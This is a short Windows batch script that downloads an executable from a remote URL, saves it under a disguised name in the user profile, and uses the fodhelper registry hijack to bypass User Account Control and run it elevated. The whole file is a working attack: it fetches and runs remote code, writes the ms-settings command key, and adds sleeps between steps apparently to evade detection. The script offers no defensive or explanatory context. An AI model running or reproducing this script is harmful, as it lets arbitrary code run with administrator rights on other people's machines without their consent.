@echo off
setlocal

:: === CONFIGURATION ===
set "EXE_URL=https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
set "EXE_PATH=%USERPROFILE%\shish.exe"

:: === STEP 1: DOWNLOAD shish.exe ===
powershell -command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%' -UseBasicParsing -ErrorAction Stop"
if not exist "%EXE_PATH%" exit /b 1

:: === STEP 2: UAC BYPASS SETUP ===
timeout /t 4 /nobreak >nul
set "REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command"
timeout /t 4 /nobreak >nul
reg add "%REG_KEY%" /f >nul
timeout /t 4 /nobreak >nul
reg add "%REG_KEY%" /v DelegateExecute /t REG_SZ /d "" /f >nul
timeout /t 4 /nobreak >nul
reg add "%REG_KEY%" /ve /t REG_SZ /d "%EXE_PATH%" /f >nul

:: === STEP 3: TRIGGER ELEVATION ===
timeout /t 10 /nobreak >nul
timeout /t 4 /nobreak >nul
start /min "" "C:\Windows\System32\fodhelper.exe"

endlocal
